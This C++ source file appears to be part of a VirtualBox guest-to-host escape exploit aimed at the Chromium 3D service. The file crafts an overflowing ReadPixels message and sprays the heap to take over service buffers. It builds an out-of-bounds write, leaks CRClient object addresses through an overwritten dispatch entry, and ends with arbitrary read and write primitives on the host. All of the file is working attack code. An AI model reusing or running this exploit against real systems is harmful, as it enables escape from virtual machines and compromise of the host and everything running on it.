#include "integer-overflow.h"
#include "vbox3d.h"
#include "chromium.h"
#include "misc.h"

#define LFH_TRIGGER_ALLOCATIONS				0x10

// obtain partial control
#define PARTIAL_FAKE_uiId					0xdeadbeef
#define PARTIAL_FAKE_uiSize					0xffffffff
#define PARTIAL_INITIAL_SPRAY				0x1000
#define PARTIAL_ALLOCATIONS_PER_ATTEMPT		0x20
#define PARTIAL_EXPLOIT_ATTEMPTS			0x20

// obtain full control
#define FULL_FAKE_uiId						0xbeefdead
#define FULL_OOB_WRITE_ATTEMPTS				0x20
uint32_t g_full_uiSize = 0x8;
uint32_t g_full_ui32Offset = 0x30;
uint64_t g_conn_addr_arb_write = 0x00;
uint32_t g_u32ClientId_arb_write = -1;

// CRClient Object
#define CRCLIENT_SIZE                       0xA10 // 0x9D0 + 0x30
#define CRCLIENT_CONN_OFFSET			    0x08
// CRConnection Object
#define CRCONNECTION_PHOSTBUFFER_OFFSET		0x1b0
#define CRCONNECTION_CBHOSTBUFFER_OFFSET	0x1b8 // this also includes cbHostBufferAllocated


uint32_t cr_nopcode_msg2[] = {
    CR_MESSAGE_OPCODES,
    0x00,
    0x01,
    (uint32_t)CR_NOP_OPCODE << 24,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

// const int msg_len = sizeof(*rp) + bytes_per_row * height;
// aim for msg_len = 0x20, where sizeof(*rp) = 0x38
// bytes_per_row*heigt = - 0x18
// height = 0x18
// bytes_per_row = -1
uint32_t cr_UnpackReadPixels_msg[] = {
    CR_MESSAGE_OPCODES,
    0x00,
    0x01,
    (uint32_t)CR_READPIXELS_OPCODE << 24,
	0x0,
	0x0,
	0x0,
	0x8,      // height
	0x0,
	0x0,
	0x0,
	0x0,
	0x0,
	0x0,
	0x1FFFFFFD, // bytes_per_row
	0x0,
	PARTIAL_FAKE_uiId,
	PARTIAL_FAKE_uiSize
};

bool integer_overflow::obtain_partial_svcbuffer_control() {
	bool bResult = false;
	uint32_t response_buffer[0x20];
    uint32_t u32ClientId = vbox3d::connect();
	uint32_t iBuffer = 0;

	// trigger lfh
	for (int i = 0; i < LFH_TRIGGER_ALLOCATIONS; i++)
		// these allocations are empty
		vbox3d::hgcm_write_buffer_create(u32ClientId, 0x100, NULL, 0);
	
	// perform initial spray
	LOG_INFO_INDENT( 1, "performing initial spray");
	for (int i = 0; i < PARTIAL_INITIAL_SPRAY; i++)
		vbox3d::hgcm_write_buffer_create(u32ClientId, 0x20, NULL, 0);

	for (int i = 0; i < PARTIAL_EXPLOIT_ATTEMPTS; i++) {
		LOG_INFO_INDENT( 1, "integer overflow attempt " + to_str(i));
		// spray
		for (int j = 0; j < PARTIAL_ALLOCATIONS_PER_ATTEMPT; j++) {
			vbox3d::hgcm_write_buffer_create(u32ClientId, 0x20, NULL, 0);
		}

		iBuffer = vbox3d::hgcm_write_buffer_create(u32ClientId, sizeof(cr_UnpackReadPixels_msg), 
                    (uint8_t*)cr_UnpackReadPixels_msg, sizeof(cr_UnpackReadPixels_msg));
        
		vbox3d::hgcm_read_buffered(u32ClientId, iBuffer, (uint8_t*)response_buffer, sizeof(response_buffer));

		// moar spray (this somehow reduces the probability of a lfh-metadata related crash)
		for (int j = 0; j < PARTIAL_ALLOCATIONS_PER_ATTEMPT; j++) {
			vbox3d::hgcm_write_buffer_create(u32ClientId, 0x20, NULL, 0);
		}

		if (vbox3d::svcbuffer_exists(u32ClientId, PARTIAL_FAKE_uiId, PARTIAL_FAKE_uiSize)) {
            LOG_SUCCESS_INDENT( 1, "obtained partial control, giving OOB write primitive!");
            bResult = true;
            break;
		}
	}

    vbox3d::disconnect(u32ClientId);
    return bResult;
}

bool integer_overflow::obtain_full_svcbuffer_control() {
	uint32_t buffer[2];
	bool bResult = false;
    uint32_t u32ClientId = vbox3d::connect();

	buffer[0] = FULL_FAKE_uiId;
	buffer[1] = g_full_uiSize;

	for (int i = 0; i < FULL_OOB_WRITE_ATTEMPTS; i++) {
		LOG_INFO_INDENT( 1, "oob write at offset 0x" + to_hex_str(g_full_ui32Offset));
		// write into next chunk
		vbox3d::hgcm_write_buffer_modify(u32ClientId, PARTIAL_FAKE_uiId, g_full_ui32Offset, 
			PARTIAL_FAKE_uiSize, (uint8_t*)buffer, sizeof(buffer));

		// check if we wrote into a svcbuffer
		if (vbox3d::svcbuffer_exists(u32ClientId, FULL_FAKE_uiId, g_full_uiSize)) {
			bResult = true;
			break;
		}

		// if this attempt failed, increment the offset
		g_full_ui32Offset += 0x30; // this is 0x20 for the object size + 0x10 for the header
	}

	if (bResult)
		LOG_SUCCESS_INDENT( 1, "obtained arbitrary write primitive (ui32Offset = 0x" + to_hex_str(g_full_ui32Offset) + ")");

    vbox3d::disconnect(u32ClientId);
    return bResult;
}

uint64_t integer_overflow::get_crclient_addr(uint32_t u32ClientId) {
	int rc = -1;
	uint64_t addr_crclient_obj;

	uint32_t client_addr_leak_msg[] = {
		CR_MESSAGE_OPCODES,
		0x00,
		0x01,
		(uint32_t)CR_EXTEND_OPCODE << 24,
		0x00,
		CR_DELETEFENCESNV_EXTEND_OPCODE,
		u32ClientId,	  // the id of the CRClient object to leak
		0x00, 0x00,		  // this is where the eventual pointer will be stored 
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 // some additional padding
	};

	// write/execute message
	rc = vbox3d::hgcm_write(u32ClientId, (uint8_t*)client_addr_leak_msg, sizeof(client_addr_leak_msg));

	if (rc != 0) {
		LOG_ERROR_INDENT( 1, "write operation failed");
		return false;
	}

	// read back response
	rc = vbox3d::hgcm_read(u32ClientId, (uint8_t*)client_addr_leak_msg, sizeof(client_addr_leak_msg));

	if (rc != 0) {
		LOG_ERROR_INDENT( 1, "read operation failed");
		return false;
	}


	addr_crclient_obj = ((uint64_t)client_addr_leak_msg[8] << 32) + client_addr_leak_msg[7];

	return addr_crclient_obj;
}

bool integer_overflow::obtain_arbitrary_rw(uint64_t addr_vboxsharedcropengl) {
    uint32_t u32ClientId = vbox3d::connect();
    uint32_t max_range = 4; // aiming for a max range of 4 allocations between objects
    bool bResult = false;
    
    // prepare get_crclient_addr
	integer_overflow::write(addr_vboxsharedcropengl + cr_unpackDispatch_OFFSET + cr_unpackDispatch_ExtendDeleteFencesNV_OFFSET,
		addr_vboxsharedcropengl + crVBoxServerClientGet_OFFSET);

    LOG_INFO_INDENT( 1, "attempting to allocate CRClient objects within " + to_str(max_range) + " allocations of each other");
    Client client_lower, client_higher;
    uint32_t actual_range = 0;
    client_higher.u32ClientId = vbox3d::connect();
    client_higher.addr = integer_overflow::get_crclient_addr(client_higher.u32ClientId);

    for (int i = 0; i < 0x1000; i++) {
        client_lower.u32ClientId = vbox3d::connect();
        client_lower.addr = integer_overflow::get_crclient_addr(client_lower.u32ClientId);

        // check if the two allocations are within range
        actual_range = abs((int64_t)client_higher.addr - (int64_t)client_lower.addr)/CRCLIENT_SIZE;
		if ( actual_range <= max_range ) {
			break;
		}
		client_lower.addr = 0;
		vbox3d::disconnect(client_lower.u32ClientId);
    }

    // if after all of the attempts the allocations didn't work, then just exit
    if (actual_range > max_range) {
        return false;
    }

    // sort the two clients
    if (client_lower.addr > client_higher.addr) {
        Client client_tmp = client_higher;
        client_higher = client_lower;
        client_lower = client_tmp;
    }

    LOG_SUCCESS_INDENT( 2, "range => " + to_str(actual_range));
    LOG_SUCCESS_INDENT( 2, "client_lower  => " + to_hex_str( (void*)(client_lower.addr)));
    LOG_SUCCESS_INDENT( 2, "client_higher => " + to_hex_str( (void*)(client_higher.addr)));

    vbox3d::disconnect(client_lower.u32ClientId);
	LOG_INFO_INDENT( 1, "preventing double free");
	for (auto i = 0; i < 0x100; i++) {
		vbox3d::hgcm_write_buffer_create(u32ClientId, 0x9D0, NULL, 0);
	}

    LOG_INFO_INDENT( 1, "writing chromium message over lower client object");
	uint32_t uiSize = (actual_range*CRCLIENT_SIZE) + CRCLIENT_CONN_OFFSET + 0x08;
	uint32_t n = ((uiSize - 0x8) - 20 - 0x10)/sizeof(unsigned int);
    LOG_INFO_INDENT( 2, "n => " + to_str(n));
	uint32_t readback_message[] = {
		CR_MESSAGE_OPCODES,
		0x00,
		0x01,
		(uint32_t)CR_EXTEND_OPCODE << 24,
		0x00,
		CR_ARETEXTURESRESIDENT_EXTEND_OPCODE,
		n,	  // value of n
		0x00, // textures point here
	};


    // write the readback message to the client at the lower address
	integer_overflow::write(u32ClientId, client_lower.addr, ((uint64_t*)readback_message)[0]);
	integer_overflow::write(u32ClientId, client_lower.addr + 0x08, ((uint64_t*)readback_message)[1]);
	integer_overflow::write(u32ClientId, client_lower.addr + 0x10, ((uint64_t*)readback_message)[2]);
	integer_overflow::write(u32ClientId, client_lower.addr + 0x18, ((uint64_t*)readback_message)[3]);

	// modifying buffer FULL_FAKE_uiId via PARTIAL_FAKE_uiId
	LOG_INFO_INDENT( 2, "manipulating fully-controlled svcbuffer to point to lower client");
	uint32_t buffer[2];
	buffer[0] = FULL_FAKE_uiId;
	buffer[1] = uiSize;

	vbox3d::hgcm_write_buffer_modify(u32ClientId, PARTIAL_FAKE_uiId, g_full_ui32Offset,
		PARTIAL_FAKE_uiSize, (uint8_t*)buffer, sizeof(buffer));

	vbox3d::hgcm_write_buffer_modify(u32ClientId, PARTIAL_FAKE_uiId, g_full_ui32Offset + 0x8, 
		PARTIAL_FAKE_uiSize, (uint8_t*)&client_lower.addr, 0x8);

    LOG_INFO_INDENT( 2, "attempting to read crclient->conn of client " + to_str(client_higher.u32ClientId));
	uint32_t *pBuffer = (uint32_t*)malloc(uiSize);

	uint32_t rc = vbox3d::hgcm_read_buffered(u32ClientId, FULL_FAKE_uiId, (uint8_t*)pBuffer, uiSize);

    g_conn_addr_arb_write = ((uint64_t*)pBuffer)[1];
    g_u32ClientId_arb_write = client_higher.u32ClientId;
    LOG_SUCCESS_INDENT( 2, "address => " + to_hex_str( (void*)g_conn_addr_arb_write));


	// time to recover fully-controlled svcbuffer, since we burned it
	LOG_INFO_INDENT( 1, "recovering fully-controlled svcbuffer");
	buffer[0] = FULL_FAKE_uiId;
	buffer[1] = g_full_uiSize;
	for (auto i = 0; i < 0x1000; i++) {
		// create buffer
		vbox3d::hgcm_write_buffer_create(u32ClientId, 0x100, NULL, 0);

		// use oob write
		vbox3d::hgcm_write_buffer_modify(u32ClientId, PARTIAL_FAKE_uiId, g_full_ui32Offset,
			PARTIAL_FAKE_uiSize, (uint8_t*)buffer, sizeof(buffer));

		// check if we wrote into a svcbuffer
		if (vbox3d::svcbuffer_exists(u32ClientId, FULL_FAKE_uiId, g_full_uiSize)) {
			LOG_SUCCESS_INDENT( 2, "successfully recovered free memory");
			bResult = true;
			break;
		}
	}

    return bResult;
}

void integer_overflow::write(uint32_t u32ClientId, uint64_t addr, uint64_t val) {
	// setup addr
	vbox3d::hgcm_write_buffer_modify(u32ClientId, PARTIAL_FAKE_uiId, g_full_ui32Offset + 0x8, PARTIAL_FAKE_uiSize, (uint8_t*)&addr, 0x8);
	// write to addr
	vbox3d::hgcm_write_buffer_modify(u32ClientId, FULL_FAKE_uiId, 0, g_full_uiSize, (uint8_t*)&val, 0x8);
}

void integer_overflow::write(uint64_t addr, uint64_t val) {
    uint32_t u32ClientId = vbox3d::connect();

	// setup addr
	vbox3d::hgcm_write_buffer_modify(u32ClientId, PARTIAL_FAKE_uiId, g_full_ui32Offset + 0x8, PARTIAL_FAKE_uiSize, (uint8_t*)&addr, 0x8);
	// write to addr
	vbox3d::hgcm_write_buffer_modify(u32ClientId, FULL_FAKE_uiId, 0, g_full_uiSize, (uint8_t*)&val, 0x8);

	// done
	vbox3d::disconnect(u32ClientId);
}

uint64_t integer_overflow::read(uint64_t addr) {
	uint32_t u32ClientId = vbox3d::connect();
	uint64_t cbHostBuffer = 0x800000800; // 0x0000000800000800;

	// first, write to cbBuffer of connection
	integer_overflow::write(g_conn_addr_arb_write + CRCONNECTION_PHOSTBUFFER_OFFSET, addr);
	integer_overflow::write(g_conn_addr_arb_write + CRCONNECTION_CBHOSTBUFFER_OFFSET, cbHostBuffer);

	// read the value
	uint64_t val;
	int rc = vbox3d::hgcm_read(g_u32ClientId_arb_write, (uint8_t*)&val, 0x8);

	// restore values to something that's disconnectable
	integer_overflow::write(g_conn_addr_arb_write + CRCONNECTION_PHOSTBUFFER_OFFSET, 0x00);
	integer_overflow::write(g_conn_addr_arb_write + CRCONNECTION_CBHOSTBUFFER_OFFSET, 0x800);

	// done
	vbox3d::disconnect(u32ClientId);
	return val;
}
